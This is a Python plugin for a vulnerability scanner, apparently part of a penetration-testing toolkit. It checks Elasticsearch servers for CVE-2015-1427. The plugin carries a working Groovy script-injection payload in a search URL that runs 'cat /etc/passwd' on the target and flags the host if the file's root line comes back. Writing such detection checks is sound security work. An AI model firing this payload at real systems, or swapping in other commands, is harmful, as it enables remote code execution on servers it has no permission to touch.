#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


async def do_scan(ip, port, service, is_http, task_msg):
    if service.lower() != 'wap-wsp' and port != 9200:
        return

    url = 'http://%s:%s' % (ip, port)
    payload = "/_search?source=%7B%22size%22%3A1%2C+%22script_fields%22%3A+%7B%22lupin%22%3A%7B%22lang%22%3A%22" \
              "groovy%22%2C%22script%22%3A+%22java.lang.Math.class.forName(%5C%22java.lang.Runtime%5C%22)." \
              "getRuntime().exec(%5C%22cat+%2Fetc%2Fpasswd%5C%22).getText()%22%7D%7D%7D"
    try:
        r = await http_client(ip, port).get(url + payload, timeout=20)
        if r.status_code == 200:
            if r.text.find('root:x:0:0') >= 0:
                ret = {
                    'alert_group': 'ES Remote Code Execution(CVE-2015-1427)',
                    'affects': url,
                    'details': u"ES低版本可通过HTTP请求在服务器内执行系统命令，导致机器被入侵\n" +
                               "\n\n" + url + payload + ' \n\nFound text [root:x:0:0]'
                }
                return ret
    except Exception as e:
        debug(e)
        

if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 9200, 'http', True, task_msg={})
    run_plugin_test(scan)
